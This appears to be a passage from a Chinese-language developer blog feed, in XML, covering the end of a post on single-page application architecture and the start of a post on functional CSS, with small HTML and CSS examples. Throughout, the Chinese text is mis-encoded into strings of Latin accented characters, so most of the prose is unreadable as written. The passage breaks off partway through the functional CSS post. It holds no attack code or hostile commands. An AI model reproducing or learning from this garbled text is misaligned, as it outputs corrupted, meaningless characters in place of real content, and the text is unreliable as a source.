ä½ æœƒç™¼ç¾å…¶å¯¦å‰å¾Œç«¯åšçš„äº‹æƒ…éƒ½å·®ä¸å¤šï¼Œåªæ˜¯å‰ç«¯æ³¨é‡åœ¨ render ç•«é¢ï¼Œå¾Œç«¯æ³¨é‡åœ¨è¼¸å‡ºè³‡æ–™ã€‚é‚„å¯ä»¥ç•«å‡ºé€™ä¸€å¼µå®Œæ•´çš„æµç¨‹åœ–ï¼š

ç”¨æ–‡å­—ä¾†è§£é‡‹çš„è©±ï¼Œæµç¨‹æ˜¯é€™æ¨£çš„ï¼š

ä½¿ç”¨è€…é€ è¨ª &#x2F;posts é€™å€‹ç¶²å€ï¼Œä»£è¡¨ä»–æƒ³çœ‹å…¨éƒ¨æ–‡ç« 
å‰ç«¯çš„è·¯ç”±å»è™•ç†ï¼Œè² è²¬å‘¼å«å°æ‡‰åˆ°çš„ controller
å‰ç«¯ controller å»å‘¼å« Model æ‹¿è³‡æ–™
å‰ç«¯ Model é€é APIï¼Œå» &#x2F;api&#x2F;posts é€™å€‹ç¶²å€æ‹¿è³‡æ–™
å¾Œç«¯è·¯ç”±æ¥åˆ° requestï¼Œä¸Ÿçµ¦å°æ‡‰åˆ°çš„å¾Œç«¯ controller
å¾Œç«¯ controller è·Ÿå¾Œç«¯ Model æ‹¿è³‡æ–™
å¾Œç«¯ controller æŠŠè³‡æ–™å‚³å›å»
å‰ç«¯ Modle æ‹¿åˆ°è³‡æ–™ä»¥å¾Œå›å‚³çµ¦å‰ç«¯ controllerï¼Œä¸¦ä¸”æŠŠè³‡æ–™ä¸Ÿçµ¦ view
client side renderï¼ŒæŠŠç•«é¢æ¸²æŸ“å‡ºä¾†

ä½ ä¸Šé¢çœ‹åˆ°çš„é€™æ•´å¥—ï¼Œå¤§æ¦‚å°±æ˜¯æœ€åŸºæœ¬çš„ SPA çš„æ¶æ§‹äº†ã€‚å¾Œç«¯åªè² è²¬è¼¸å‡ºè³‡æ–™ï¼Œå‰ç«¯ä¾†è² è²¬æŠ“è³‡æ–™è·Ÿæ¸²æŸ“ç•«é¢ã€‚æŠŠå‰å¾Œç«¯å®Œå®Œå…¨å…¨çš„åˆ‡é–‹äº†ï¼Œå°±ç®—ä½ å¾Œç«¯å£æ‰ï¼Œä½ å‰ç«¯é‚„æ˜¯çœ‹å¾—åˆ°ç•«é¢ï¼ˆåªæ˜¯å¯èƒ½æœƒé¡¯ç¤ºå€‹éŒ¯èª¤ç•«é¢ä¹‹é¡çš„ï¼‰ï¼›ä½ å‰ç«¯å£æ‰ï¼Œå¾Œç«¯é‚„æ˜¯èƒ½å®‰ç©©çš„è¼¸å‡ºè³‡æ–™ä¾›å…¶ä»–æœå‹™ä½¿ç”¨ã€‚
å…©é‚Šä¹¾ä¹¾æ·¨æ·¨ï¼Œè€Œä¸”ä»»ä½•ä¸€é‚Šéƒ½æœƒæ¯”è¼ƒå¥½ç¶­è­·ï¼Œå‰ç«¯å·¥ç¨‹å¸«æƒ³è¦æ”¹ä»»ä½•è·Ÿä»‹é¢æœ‰é—œçš„æ±è¥¿ï¼Œéƒ½è·Ÿå¾Œç«¯å®Œå…¨æ²’æœ‰é—œä¿‚ï¼Œå…¶å¯¦å°±ç­‰æ–¼æ˜¯å…©å€‹ä¸åŒçš„å°ˆæ¡ˆçš„æ„æ€ã€‚
æˆ‘å€‘çœŸçš„éœ€è¦ SPA å—ï¼Ÿä¸Šé¢æåˆ°äº†é€™éº¼å¤šï¼Œæˆ‘èªç‚ºå‰ç«¯é–‹ç™¼çš„è¤‡é›œåŒ–è·Ÿ SPA æœ‰æ»¿å¤§çš„é—œä¿‚ï¼Œç•¢ç«Ÿä½ ç¾åœ¨å°±ç­‰æ–¼æ˜¯åœ¨é–‹ç™¼ä¸€å€‹å®Œæ•´çš„ Appï¼Œæ€éº¼å¯èƒ½ä¸è¤‡é›œï¼Ÿ
å¯æ˜¯åˆ¥å¿˜è¨˜å•è‡ªå·±ï¼š

æˆ‘å€‘çœŸçš„éœ€è¦ SPA å—ï¼Ÿ

æœ‰äº›å ´æ™¯æ˜¯ä¸€å®šè¦ç”¨çš„ï¼Œä¾‹å¦‚èªªéŸ³æ¨‚æ’­æ”¾ç¶²ç«™ã€‚
ç‚ºä»€éº¼ï¼Ÿå› ç‚ºä½ å¿…é ˆä¸€é‚Šæ’­æ”¾éŸ³æ¨‚ï¼Œä¸€é‚Šè®“ä»–å¯ä»¥åœ¨ç¶²ç«™ä¸Šçœ‹å…¶ä»–çš„è³‡æ–™ï¼Œä¾‹å¦‚èªªæ­Œæ‰‹ä»‹ç´¹ã€å°ˆè¼¯ä»‹ç´¹ä¹‹é¡çš„ã€‚å¦‚æœä½ ä»Šå¤©ä¸æ˜¯ç”¨ SPAï¼Œé‚£ä½¿ç”¨è€…é»åˆ°åˆ¥çš„é é¢çš„æ™‚å€™ï¼Œç€è¦½å™¨å°±è·³é äº†ï¼ŒéŸ³æ¨‚å°±åœäº†ã€‚å“‡é é€™å€‹é«”é©—ä¹Ÿå¤ªå·®äº†ï¼Œå®Œå…¨ä¸èƒ½æ¥å—ã€‚
æ‰€ä»¥é€™ç¨®ç¶²ç«™ä¸€å®šè¦ç”¨ SPAï¼Œæ²’æœ‰å…¶ä»–é¸æ“‡ã€‚ç”¨äº†ä¹‹å¾Œå› ç‚ºä¸æœƒè·³é ï¼Œæ‰€ä»¥ä½ é»æ“Šæ­Œæ‰‹ä»‹ç´¹çš„æ™‚å€™ï¼Œåªæ˜¯ç™¼ä¸€å€‹ ajax requestï¼Œç„¶å¾Œæ”¶åˆ° response ä¹‹å¾Œç”¨ JavaScript æŠŠæ¥æ”¶åˆ°çš„è³‡æ–™ render æˆ HTML é¡¯ç¤ºå‡ºä¾†ã€‚ä¸ç®¡åˆ°å“ªä¸€å€‹é é¢ï¼Œéƒ½ä¸æœƒçœŸçš„è·³è½‰ï¼Œä¸æœƒè¼‰å…¥æ–°çš„ HTML æª”æ¡ˆã€‚
é‚£æœ‰äº›åœ°æ–¹æˆ‘è¦ºå¾—ä¸ç”¨ä¹Ÿè¡Œï¼Œä½†ç”¨äº†ä¹‹å¾Œå¯ä»¥åŠ å¼·ä½¿ç”¨è€…é«”é©—ï¼Œä¾‹å¦‚èªª Twitch å‰ä¸€é™£å­çš„æ–°åŠŸèƒ½ï¼Œåœ¨ä½ è·³å»çœ‹å…¶ä»–é é¢çš„æ™‚å€™ï¼Œä½ åŸæœ¬åœ¨çœ‹çš„å¯¦æ³æœƒç¸®åˆ°å·¦ä¸‹è§’ã€‚

ç¸½ä¹‹ï¼Œæœƒéœ€è¦ç”¨åˆ° Single Page Application çš„å ´åˆæœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯å› ç‚ºå¿…é ˆè¦é€™æ¨£åšï¼Œå¦ä¸€å€‹æ˜¯å› ç‚ºå¯ä»¥å¢é€²ä½¿ç”¨è€…é«”é©—ï¼Œè®“ä½¿ç”¨è€…è¦ºå¾—æ“ä½œèµ·ä¾†æ›´é †æš¢ã€‚
å¦‚æœä½ ç™¼ç¾ä½ è¦åšçš„æ±è¥¿ä¸ç¬¦åˆé€™å…©ç¨®å ´åˆï¼Œä½ å¯ä»¥é¸æ“‡ä¸è¦åš SPAï¼Œå¯ä»¥é¸æ“‡å°±ä¾ç…§ä¹‹å‰é‚£æ¨£çš„ MVC æ¶æ§‹ï¼Œç”± server side å» renderã€å»è™•ç†ã€‚é€™ä¸€åˆ‡éƒ½æ˜¯å¯ä»¥é¸æ“‡çš„ã€‚
é™¤æ­¤ä¹‹å¤–ï¼Œå…¶å¯¦ SPA ä¹Ÿæœ‰ä¸€äº›ç¼ºé»ï¼Œä¾‹å¦‚èªªä½ æ˜æ˜åªè¦çœ‹ä¸€å€‹é é¢è€Œå·²ï¼Œå»è¦æŠŠä¸€å¤§åŒ…çš„ JavaScript æˆ–æ˜¯å…¶ä»–é é¢çš„ template ä¸€èµ·ä¸‹è¼‰ä¸‹ä¾†ã€‚
åˆæˆ–è€…å› ç‚ºæ˜¯ client side renderï¼Œæ‰€ä»¥æœ‰äº›æœå°‹å¼•æ“çˆ¬ä¸åˆ°ä»»ä½•è³‡æ–™ï¼ˆå› ç‚ºä½ çš„ index.html å¹¾ä¹æ˜¯ç©ºçš„ï¼‰ï¼Œä¸é Google å¾ˆå²å®³ï¼Œæœƒçˆ¬ JavaScript åŸ·è¡Œå®Œä¹‹å¾Œçš„çµæœã€‚å¯æ˜¯é€™å° SEO ä¾†èªªé‚„æ˜¯ä¸å¤ªå¥½ã€‚
ç•¶ç„¶ä¸Šé¢éƒ½æœ‰ä¸€äº›æ–¹æ³•å¯ä»¥è§£æ±ºå•¦ï¼Œä¾‹å¦‚èªªå¯ä»¥æŠŠ js æª”æ¡ˆåˆ†é–‹ï¼Œä½ åˆ°é‚£ä¸€å€‹é é¢å°±åªè¦ä¸‹è¼‰é‚£ä¸€å€‹é é¢çš„ js å³å¯ã€‚SEO çš„è§£æ±ºæ–¹æ³•å‰‡æ˜¯å°‡å…©ç¨®çµåˆï¼Œç¬¬ä¸€æ¬¡å…ˆåœ¨ server side renderï¼Œä¹‹å¾Œçš„æ“ä½œéƒ½æ”¹ç”¨ client side renderï¼Œå°±å¯ä»¥ä¿è­‰æœå°‹å¼•æ“ä¹Ÿèƒ½çˆ¬åˆ°å®Œæ•´çš„ HTMLã€‚
ä½†ä½ çŸ¥é“çš„ï¼Œå¯ä»¥è§£æ±ºæ˜¯ä¸€å›äº‹ï¼Œè¦èŠ±å¤šå°‘å¿ƒåŠ›å»è§£æ±ºåˆæ˜¯å¦å¤–ä¸€å›äº‹äº†ã€‚
ç¸½çµé€™ç¯‡å¤§æ¦‚è¬›åˆ°äº†ä¸€é–‹å§‹æœ€å¸¸è¦‹çš„ç¶²ç«™æ¶æ§‹ï¼Œç„¶å¾Œåˆ°è¿‘æœŸå°è‡´å‰ç«¯é–‹ç™¼è¤‡é›œåŒ–çš„ SPAã€‚æˆ‘ä»¥å‰å‰›æ¥è§¸çš„æ™‚å€™ä¹Ÿæ˜¯ä¸€é ­éœ§æ°´ï¼Œæƒ³èªªåˆ°åº•å‰ç«¯ç‚ºä»€éº¼éœ€è¦ MVCã€‚å¯æ˜¯ç¶“éé€™ä¸€é€£ä¸²çš„è„ˆçµ¡æ€è€ƒä¸‹ä¾†ï¼Œå°±å¾ˆèƒ½ç†è§£åŸå› äº†ã€‚
ç•¶ä½ æ±è¥¿è®Šå¾—æ„ˆä¾†æ„ˆè¤‡é›œï¼Œå°±éœ€è¦ä¸€å€‹æ¶æ§‹å»æŠŠè·è²¬åˆ‡å‰²é–‹ä¾†ï¼Œä¸ç„¶æœƒé€ æˆæ—¥å¾Œç¶­è­·ä¸Šçš„å›°é›£ã€‚
ç•¶ä½ è¶Šç­è§£ SPA æ‰€å¸¶ä¾†çš„å„ªç¼ºé»ï¼Œä½ åœ¨é¸æ“‡è¦ä¸è¦ç”¨çš„æ™‚å€™å°±æœ‰æ›´å¤šé¢å‘å¯ä»¥åƒè€ƒï¼Œå°±æœ‰æ›´å¤šçš„ç†ç”±å»æ”¯æŒä½ æ‰€åšçš„æ±ºå®šï¼Œè€Œä¸å–®å–®åƒ…æ˜¯ã€Œå“‡ï¼å¥½æ½®å–”ï¼åˆ¥äººç”¨äº†æˆ‘ä¹Ÿè¦ç”¨ï¼ã€
å¸Œæœ›é€™ç¯‡å°å¤§å®¶æœ‰å¹«åŠ©ï¼Œæœ€å¾Œé™„ä¸Šä¸€ç¯‡å»¶ä¼¸é–±è®€ï¼šWhy I hate your Single Page App
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>frontend</tag>
        <tag>backend</tag>
        <tag>mvc</tag>
        <tag>SPA</tag>
      </tags>
  </entry>
  <entry>
    <title>é‚ªé­”æ­ªé“é‚„æ˜¯è‹¦å£è‰¯è—¥ï¼ŸFunctional CSS ç¶“é©—åˆ†äº«</title>
    <url>/2019/01/26/functional-css/</url>
    <content><![CDATA[å‰è¨€ä»¥ CSS æ¶æ§‹æ–¹æ³•ä¾†èªªï¼Œä¸»æµçš„å¤§æ¦‚å¯ä»¥åˆ†æˆä¸‰å€‹ï¼šOOCSSã€SMACSSã€BEMï¼Œé€™äº›æ¶æ§‹çš„æå‡ºéƒ½æ˜¯ç‚ºäº†è®“ CSS æ›´å¥½ç¶­è­·ï¼Œé€™å¹¾å€‹çš„ä»‹ç´¹ä»¥åŠå·®ç•°å¯ä»¥åƒè€ƒ @arvinh å¯«éçš„ æ·ºè«‡ CSS æ–¹æ³•è«–èˆ‡ Atomic CSSã€‚
ä½†æˆ‘å€‘ä»Šå¤©è¦è«‡çš„ä¸æ˜¯ä¸Šé¢æåˆ°çš„é€™ä¸‰ç¨®ï¼Œè€Œæ˜¯å¦å¤–ä¸€ç¨®ç›¸è¼ƒä¹‹ä¸‹æ²’é‚£éº¼ä¸»æµï¼ˆä½†å¥½åƒæœ‰æ…¢æ…¢æµè¡Œçš„è¶¨å‹¢ï¼‰ï¼Œè€Œä¸”å¾ˆå°‘äººç¬¬ä¸€çœ¼çœ‹åˆ°å°±æœƒè´ŠåŒçš„æ–¹æ³•ï¼šfunctional CSSã€‚
ä»€éº¼æ˜¯ functional CSSç›´æ¥èˆ‰ä¸€å€‹ä¾‹å­æœ€å¿«ï¼š
// ä¸€èˆ¬çš„å¯«æ³•&lt;div class=&quot;hello&quot;&gt;Hello&lt;/div&gt;  .hello &#123;  font-weight: 700;  color: red;  padding: 1rem;&#125;  // Functional CSS&lt;div class=&quot;fw7 red pa3&quot;&gt;Hello&lt;/div&gt;  .fw7 &#123;  font-weight: 700;&#125;.red &#123;  color: red;&#125;.pa3 &#123;  padding: 1rem;&#125;

å°±å¥½åƒ functional programming é‚£æ¨£ï¼Œæ¯å€‹å‡½å¼éƒ½æ²’æœ‰å‰¯ä½œç”¨è€Œä¸”å¯ä»¥äº’ç›¸çµ„åˆï¼Œåœ¨ functional CSS è£¡é¢æ¯ä¸€å€‹ class name éƒ½åªè² è²¬ä¸€å€‹éƒ¨åˆ†ï¼ˆä¸ä¸€å®šæ˜¯ä¸€å€‹å±¬æ€§ï¼‰ï¼Œå°±åƒæˆ‘ä¸Šé¢èˆ‰çš„é‚£å€‹ç¯„ä¾‹ï¼Œå®ƒæœƒç”¢ç”Ÿä¸€å€‹å­—æ˜¯ç²—é«”ã€ç´…è‰²ä¸¦ä¸”æœ‰ padding çš„ divã€‚
é †å¸¶ä¸€æï¼Œå¦‚æœä½ æœ‰ç”¨é Bootstrap4 çš„è©±ï¼Œä½ å¾ˆæœ‰å¯èƒ½å·²ç¶“é«”é©—é functional CSS äº†ï¼Œè£¡é¢å°±å‡ºç¾äº†ä¸€å¤§å †é€™ç¨®é¡å‹çš„ class name ã€‚
ä½ å–œæ­¡é€™ç¨®é¢¨æ ¼çš„å¯«æ³•å—ï¼Ÿ
å¦‚æœä½ æ˜¯ç¬¬ä¸€æ¬¡çœ‹åˆ°é€™ç¨®å¯«æ³•ï¼Œæˆ‘è¦ºå¾—ä½ å¿ƒè£¡æƒ³çš„æ‡‰è©²æ˜¯ï¼šã€Œé€™æ˜¯ä¸‰å°ï¼Œå¥½å™å¿ƒã€ã€ã€Œé€™ä¸å°±æ˜¯ inline style å—ã€ã€ã€Œé€™æ ¹æœ¬ä¸æ˜¯ CSS å§ï¼ã€
æ²’é—œä¿‚ï¼Œæˆ‘ç¬¬ä¸€çœ¼çœ‹åˆ°ä¹Ÿæ˜¯é€™æ¨£è¦ºå¾—çš„ï¼Œä½†æœƒå¯«é€™ç¯‡æ–‡ç« å°±æ˜¯å› ç‚ºæˆ‘å¾Œä¾†æ”¹è§€äº†ï¼Œæ–¼æ˜¯æ¥ä¸‹ä¾†æˆ‘è¦è«‡è«‡æˆ‘èˆ‡ functional CSS å¾äº’ç›¸å­æƒ¡åˆ°å’Œè§£çš„éç¨‹ã€‚
æˆ‘èˆ‡ functional CSS çš„æ„›æ¨ç³¾è‘›ä¸€é–‹å§‹çœ‹åˆ° functional CSS è¦ºå¾—å¾ˆç‰¹åˆ¥ä½†ä¹Ÿå¾ˆå¥‡æ€ªï¼Œè€å¯¦èªªé€£æƒ³è©¦çš„æ„Ÿè¦ºéƒ½æ²’æœ‰ï¼Œåªè¦ºå¾—é€™æ¨£å¯« CSS ä¹Ÿå¤ªå¥‡æ€ªäº†å§ï¼Œæ ¹æœ¬å°±æ˜¯é‚ªé­”æ­ªé“ï¼è€Œä¸” class name ä¸€é»å¯è®€æ€§éƒ½æ²’æœ‰ã€‚
ä½†æœ‰å¤©æˆ‘åœ¨ hacker news ä¸Šé¢è®€åˆ°äº†é€™ç¯‡æ–‡ç« ï¼šIn defense of Functional CSSï¼Œå¾¹åº•æ”¹è®Šäº†æˆ‘å°å®ƒçš„æƒ³æ³•ã€‚
é€™ç¯‡æ–‡ç« é‡å°å¹¾å€‹å¸¸è¦‹çš„æ‰¹è©•çµ¦äºˆäº†åé§ï¼Œæˆ‘ä¸‹é¢èˆ‰å¹¾å€‹æ–‡ç« è£¡é¢æçš„ä¾‹å­ï¼š
è·Ÿ inline style å·®åœ¨å“ªï¼Ÿ
Inline style ä¸èƒ½æœ‰ media query
inline style çš„å±¬æ€§å¯ä»¥éš¨æ„è¨­ç½®ï¼ˆé€™ä¹‹å¾Œæˆ‘æœƒè¬›è©³ç´°ä¸€é»ï¼‰
Inline style æ²’è¾¦æ³•è™•ç† :before, :after
Inline style ç„¡æ³•é‡ç”¨ï¼Œä½†æ˜¯ css class å¯ä»¥ï¼Œæˆ‘å¯ä»¥å®šç¾©ä¸€å€‹å«åš .bg-red çš„è¦å‰‡ï¼Œæƒ³è¦èƒŒæ™¯æ˜¯ç´…è‰²çš„åŠ ä¸Šå»å°±è¡Œäº†
Inline style è·Ÿ functional css çš„å¯è®€æ€§é‚„æ˜¯æœ‰å·®ï¼Œæ¯”æ¯”çœ‹ class=&quot;f-sm bg-blue&quot; è·Ÿ style=&quot;font-size: 10px; background-color: #0000ff;&quot;

æˆ‘è¦ºå¾—ä½œè€…çš„å¹¾å€‹åé§éƒ½æ»¿åˆç†çš„ï¼Œinline style è·Ÿ functional CSS çš„ç¢ºæ˜¯æœ‰å·®ï¼Œæˆ‘æƒ³è®€åˆ°é€™è£¡å¤§å®¶æ‡‰è©²å¯ä»¥èªåŒå¦‚æœé€™å…©å€‹ä¸€å®šè¦é¸ä¸€å€‹ï¼Œé¸å¾Œè€…æ˜¯åˆç†è¨±å¤šçš„ï¼Œå› ç‚ºå¯é‡ç”¨è€Œä¸”å¯è®€æ€§è¼ƒé«˜ã€‚
ä½†å¤§å¤šæ•¸äººåå° functional CSS çš„ä¸»è¦ç†ç”±é‚„æœ‰ä¸€å€‹ï¼Œé‚£å°±æ˜¯æœƒæŠŠ html å¼„çš„å¾ˆé«’è€Œä¸”ä¸çŸ¥é“åœ¨å¹¹å˜›ã€‚
ä¾‹å¦‚èªªåŸæ–‡ä¸­æåˆ°çš„ç¯„ä¾‹ï¼š
&lt;div class=&quot;profile-card&quot;&gt;  ...&lt;/div&gt;&lt;style&gt;  .profile-card &#123;    padding: 20px;    margin: 20px;    color: #eee;    background: #333;    border: 1px solid #555;  &#125;&lt;/style&gt;&lt;div class=&quot;m-5 p-5 text-gray-light bg-gray-darker border border-gray-light&quot;&gt;  ...&lt;/div&gt;

å‰è€…ä½ ä¸€çœ‹å°±çŸ¥é“æ˜¯ä¸€å€‹ profile cardï¼Œä½†å¾Œè€…ä½ å…‰çœ‹ html æ ¹æœ¬çœ‹ä¸å‡ºä¾†ä»–æ˜¯ä»€éº¼ã€‚
åœ¨é€™é‚Šä½œè€…çµ¦çš„è§£é‡‹æˆ‘è¦ºå¾—ä¹Ÿå¾ˆä¸éŒ¯ï¼š

ä½ å¯ä»¥ä¸€èµ·ç”¨å•Š

å°æ¬¸ï¼Œä½ å¯ä»¥è®Šæˆé€™æ¨£ï¼š
&lt;div class=&quot;profile-card m-5 p-5 text-gray-light bg-gray-darker border border-gray-light&quot;&gt;  ...&lt;/div&gt;

é€™æ¨£ä½ å¯ä»¥ç¶­æŒåŸæœ‰çš„ class name å‘½åæ–¹å¼ï¼Œè€Œé€™å€‹å‘½ååªæ˜¯ç‚ºäº†æ–¹ä¾¿è®“ä½ è¾¨è­˜å‡ºé€™å€‹å…ƒç´ æ˜¯ä»€éº¼ï¼Œå¯¦éš›ä¸Šåœ¨åš styling çš„é‚„æ˜¯å¾Œé¢çš„é‚£äº› functional class nameã€‚
å¦‚æœé‚„æƒ³å†åé§ï¼Œå¤§æ¦‚å°±æ˜¯ html çœ‹èµ·ä¾†é‚„æ˜¯å¾ˆé«’è€Œä¸”ä¸€å¤§å † class nameã€‚æˆ‘è¦ºå¾—é€™æ˜¯å„ªé»ä¹Ÿæ˜¯ç¼ºé»ï¼Œç«¯çœ‹ä½ æ€éº¼å»çœ‹å®ƒã€‚
è‹¥æ˜¯ä½ å®Œå…¨ä¸çŸ¥é“é‚£äº› class name æ˜¯ä»€éº¼æ„æ€ï¼Œä½ ç•¶ç„¶æœƒè¦ºå¾—é‚£æ˜¯ä¸€å †åƒåœ¾ï¼›ä½†å¦‚æœä½ çŸ¥é“æ˜¯ä»€éº¼æ„æ€ï¼Œä½ æœƒç™¼ç¾å…‰æ˜¯çœ‹ HTMLï¼Œä½ å°±å¯ä»¥çŸ¥é“æ¨£å¼é•·æ€æ¨£ï¼Œä½ ä¸å¿…åœ¨ HTML èˆ‡ CSS ä¹‹é–“åˆ‡æ›ï¼Œè€Œæ˜¯åªè¦å°ˆæ³¨åœ¨ HTML å°±å¥½ï¼Œå› ç‚ºå®ƒçš„æ¨£å¼éƒ½å¯«åœ¨ class name è£¡é¢äº†ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œä½ åŸæœ¬çš„é–‹ç™¼æµç¨‹å¯èƒ½æ˜¯é€™æ¨£ï¼š

å»ºç«‹ä¸€å€‹ profile-card çš„html
åŠ ä¸Š .profile-card class name
é–‹ä¸€å€‹ profile-card.css é–‹å§‹å¯«æ¨£å¼
æ–°å¢ profile-card-avatar çš„ html
åŠ ä¸Š .profile-card-avatar çš„ html
é–‹å§‹å¹«é€™å€‹ class name å¯«æ¨£å¼

ä½†æ¡ç”¨ functional CSS ä¹‹å¾Œï¼Œé–‹ç™¼æµç¨‹è®Šé€™æ¨£ï¼š

å»ºç«‹ä¸€å€‹ profile-card çš„html
å¹« profile-card åŠ ä¸Š class name
æ–°å¢ profile-card-avatar çš„html
å¹« profile-card-avatar åŠ ä¸Š class name

ä¸ç”¨å†åœ¨ HTML èˆ‡ CSS é–“åˆ‡æ›ï¼Œå› ç‚ºæ²’æœ‰ CSS æª”æ¡ˆè®“ä½ åˆ‡æ›ã€‚
å¯æ˜¯é‡ç”¨æ€§å¤ªä½äº†å§ï¼Œæˆ‘è¦å¹«æ¯å€‹ button éƒ½å¯« 20 å€‹ classï¼Ÿé€™å€‹æ‰¹è©•åŸºæœ¬ä¸Šæ˜¯èªªï¼Œå‡è¨­æˆ‘æœ‰ä¸€å€‹ button ç”¨ functional css ä¹‹å¾Œé•·é€™æ¨£ï¼š&lt;div class=&quot;bg-blue fw5 pa1&quot;&gt;Click me&lt;/div&gt;
é‚£å¦‚æœæˆ‘æœ‰å…¶ä»–åœ°æ–¹è¦ç”¨é€™å€‹ buttonï¼Œæˆ‘ä¸å°±è¦è¤‡è£½é€™ä¸€ä¸²ï¼Ÿå¦‚æœæˆ‘ button çš„æ¨£å¼æ›äº†ï¼Œé‚£æˆ‘ä¸å°±æ‰€æœ‰åœ°æ–¹éƒ½è¦æ”¹ï¼Ÿé€™å€‹é‡ç”¨æ€§ä¹Ÿå¤ªå·®äº†å§ã€‚
åŸæ–‡ä¸­çµ¦çš„åé§æ˜¯å¦‚æœçœŸçš„æœ‰é€™ç¨®æƒ…æ³ç™¼ç”Ÿï¼Œä½ æ‡‰è©²å„ªå…ˆè€ƒæ…®çš„æ˜¯æŠŠé€™æ®µ HTML æŠ½æˆå¯é‡ç”¨çš„ template ä¹‹é¡çš„ï¼Œè€Œä¸æ˜¯æŠŠé€™å€‹å•é¡Œæ€ªåˆ° class èº«ä¸Šã€‚
æˆ–è€…æˆ‘é€™æ¨£èªªå¥½äº†ï¼Œæ‡‰è©²æŠŠé€™å€‹æ±è¥¿è®Šæˆä¸€å€‹ componentï¼Œé€™æ¨£å•é¡Œå°±è¿åˆƒè€Œè§£äº†ï¼Œå› ç‚ºä½ åªè¦æ”¹ component å°±å¥½ï¼Œä¸ç”¨æ¯å€‹åœ°æ–¹éƒ½æ”¹ã€‚
ä»¥ä¸Šå°±æ˜¯é€™ç¯‡æ–‡ç« å¤§æ¦‚çš„å…§å®¹ï¼Œæœ‰èˆˆè¶£çš„å¯ä»¥å»çœ‹åŸæ–‡ï¼ŒåŸæ–‡å¯«çš„æ¯”æˆ‘æ‘˜è¦å¾—æ¸…æ¥šæ»¿å¤šçš„è€Œä¸”è¬›äº†æ›´å¤šã€‚ä½†ç¸½ä¹‹æˆ‘çœ‹å®Œé€™ç¯‡æ–‡ç« ä¹‹å¾Œæœ‰äº†äº›æƒ³æ³•ï¼Œä¸¦ä¸”é–‹å§‹èªè­˜åˆ° functional CSS çš„å¥½è™•åˆ°åº•åœ¨å“ªã€‚
Functional CSS åˆ°åº•å¥½åœ¨å“ªï¼Ÿç¬¬ä¸€å€‹å¥½è™•å°±æ˜¯ä½ å¾æ­¤ï¼ˆå¹¾ä¹ï¼‰ä¸å¿…å†å¯« CSSï¼è€Œä¸”ä½ ä¹Ÿä¸ç”¨å†çŒ¶è±« class name åˆ°åº•è¦å–ä»€éº¼äº†ï¼
é€™ç°¡ç›´æ‹¯æ•‘äº†ä¸€å †æœ‰å‘½åææ‡¼ç—‡çš„é–‹ç™¼è€…ã€‚ç”¨äº† functional CSS ä»¥å¾Œåªè¦å¹« html åŠ ä¸Šç›¸å°æ‡‰çš„ class å°±å¥½ï¼Œå°±å¦‚åŒæˆ‘ä¸Šé¢èˆ‰çš„ç¯„ä¾‹é‚£æ¨£ã€‚
é€™æ™‚å€™ä½ å¯èƒ½æœƒèªªï¼šã€Œé‚£æˆ‘è¦æ€éº¼çŸ¥é“é€™æ®µ HTML åˆ°åº•æ˜¯å¹¹å˜›çš„ï¼Ÿã€
ç¬¬ä¸€ç¨®è§£æ³•ä¸Šé¢æœ‰æéï¼Œå°±æ˜¯æŠŠåŸæœ¬çš„ class ä¹ŸåŠ å›å»ï¼Œæ‰€ä»¥æœ‰æ„ç¾©çš„ class name ç•¶ä½œè¾¨è­˜ç”¨é€”ï¼Œfunctional css ç•¶ä½œæ¨£å¼ä¾†ä½¿ç”¨ï¼Œä½†é€™å€‹æ–¹æ³•æˆ‘å€‹äººè¦ºå¾—æœ‰é»å¤šæ­¤ä¸€èˆ‰å°±æ˜¯äº†ï¼Œè€Œä¸”é‚„è¦å†èŠ±æ™‚é–“æƒ³è¦å‘½åä»€éº¼ classã€‚
ç¬¬äºŒç¨®è§£æ³•æ˜¯ componentï¼Œæˆ‘å¾Œä¾†æ„è­˜åˆ°æœ‰äº› functional CSS æœƒç¢°åˆ°çš„å•é¡Œå¯ä»¥é  component ä¾†è§£ï¼Œé€™å€‹ component å¯ä»¥æ˜¯ web-component ä¹Ÿå¯ä»¥æ˜¯ React æˆ–æ˜¯ Vue è£¡é¢çš„é‚£ç¨® componentã€‚
ç•¶æˆ‘å€‘æœ‰äº† component ä»¥å¾Œï¼Œå°±æ²’æœ‰é‚£éº¼éœ€è¦ class name äº†ï¼Œå› ç‚ºä½ çœ‹ component çš„åç¨±å°±çŸ¥é“å®ƒæ˜¯å€‹æŒ‰éˆ•ï¼Œå¾å…ƒä»¶çš„å‘½åå°±å¯ä»¥çŸ¥é“ï¼Œä¸å¿…å†å¾ class nameã€‚æ³ä¸”å°±ç®—åŸæœ¬æœ‰ class nameï¼Œä½ é‚„æ˜¯è¦å…ˆå»å°ç…§ç•«é¢æ‰èƒ½ç¢ºå®šä½ åˆ°åº•è¦æ”¹å“ªè£¡ï¼Œç•¢ç«Ÿæœ‰äº› class name å‘½åçš„è¶…ç´šæ¨¡ç³Šï¼Œé€™æˆ‘ç›¸ä¿¡å¤§å®¶ä¸€å®šéƒ½æœ‰é«”æœƒéã€‚
åŸæœ¬åœ¨å¯« CSS æ™‚ä½ éœ€è¦è€ƒæ…®çš„å¾ˆå¤šæ±è¥¿ï¼Œåˆ°äº† functional CSS å¹¾ä¹éƒ½ä¸å­˜åœ¨ï¼Œä½ è¦åšçš„åªæœ‰å¹« HTML åŠ ä¸Š functional CSS çš„ class name å¹«å®ƒè£é£¾è€Œå·²ã€‚
ç¬¬äºŒå€‹å¥½è™•æ˜¯ä½ ä¸€ä½†æ¡ç”¨ functional CSSï¼Œå°±å¯ä»¥ç«‹åˆ»å¹«ä½ çš„ project ç”¢ç”Ÿå‡ºä¸€å¥—è¦ç¯„ï¼Œæœ‰é»åƒæ˜¯ design guideline é‚£æ¨£ã€‚
é€™æ˜¯ä»€éº¼æ„æ€å‘¢ï¼Ÿ
é¦–å…ˆï¼Œå¤§å®¶å¯èƒ½æœƒå° functional CSS æœ‰å€‹éŒ¯èª¤èªçŸ¥ï¼Œé‚£å°±æ˜¯è¦ºå¾—å®ƒèªªç©¿äº†é‚„æ˜¯å¦å¤–ä¸€ç¨®å½¢å¼çš„ inline styleï¼Œåªæ˜¯å¤šæ­¤ä¸€èˆ‰å¯«æˆ class è€Œå·²ã€‚
